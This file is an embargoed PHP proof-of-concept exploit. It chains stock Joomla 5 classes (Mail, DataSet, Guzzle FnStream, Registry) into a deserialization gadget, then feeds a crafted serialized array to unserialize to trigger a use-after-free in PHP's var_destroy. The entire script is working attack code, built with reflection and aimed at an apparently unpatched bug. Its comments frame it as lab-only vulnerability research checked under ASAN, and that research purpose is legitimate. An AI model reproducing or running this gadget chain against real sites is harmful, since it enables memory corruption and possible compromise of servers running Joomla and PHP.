<?php
/**
 * LAB-ONLY / EMBARGOED — Joomla 5 stock-class re-entry gadget for the
 * var_destroy UAF. Defines NO classes: it uses the Composer-autoloaded
 * classes that ship with Joomla 5.
 *
 * Chain:
 *   var_destroy -> i_zval_ptr_dtor (unlocked)
 *     Joomla\CMS\Mail\Mail::__destruct          (inherits PHPMailer's)
 *       PHPMailer::smtpClose()
 *         DataSet::__call('connected'/'quit'/'close') -> each object
 *           GuzzleHttp\Psr7\FnStream::close() -> ($this->_fn_close)()
 *             Joomla\Registry\Registry::__clone()
 *               unserialize(serialize($this->data))   <-- re-entry
 *
 * Usage (lab):
 *   JL=/path/to/joomla php -d ... poc/joomla_var_destroy_gadget.php
 * Under ASAN it reports the var_unserializer.c UAF; on stock it is silent.
 *
 * See docs/JOOMLA_GADGET.md. Do not publish before the PHP fix ships.
 */
define('_JEXEC', 1);
$JL = getenv('JL') ?: '/jl';
require $JL . '/libraries/vendor/autoload.php';

$reg = (new ReflectionClass(Joomla\Registry\Registry::class))
    ->newInstanceWithoutConstructor();
(new ReflectionProperty(Joomla\Registry\Registry::class, 'data'))->setValue($reg, []);

$fn = (new ReflectionClass(GuzzleHttp\Psr7\FnStream::class))
    ->newInstanceWithoutConstructor();
$fn->_fn_close = [$reg, '__clone'];

$smtp = (new ReflectionClass(PHPMailer\PHPMailer\SMTP::class))
    ->newInstanceWithoutConstructor();

$ds = (new ReflectionClass(Joomla\Data\DataSet::class))
    ->newInstanceWithoutConstructor();
(new ReflectionProperty(Joomla\Data\DataSet::class, 'objects'))
    ->setValue($ds, [$smtp, $fn]);

$mail = (new ReflectionClass(Joomla\CMS\Mail\Mail::class))
    ->newInstanceWithoutConstructor();
(new ReflectionProperty(PHPMailer\PHPMailer\PHPMailer::class, 'smtp'))
    ->setValue($mail, $ds);

$inner = serialize($mail);
$N = 1016;
$p = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) {
    $p .= 'i:0;N;';
}
$p .= 'i:99999;' . $inner . 'i:99999;i:42;}';
fwrite(STDERR, 'class=' . get_class($mail) . ' payload=' . strlen($p) . "\n");
@unserialize($p);
fwrite(STDERR, "done\n");
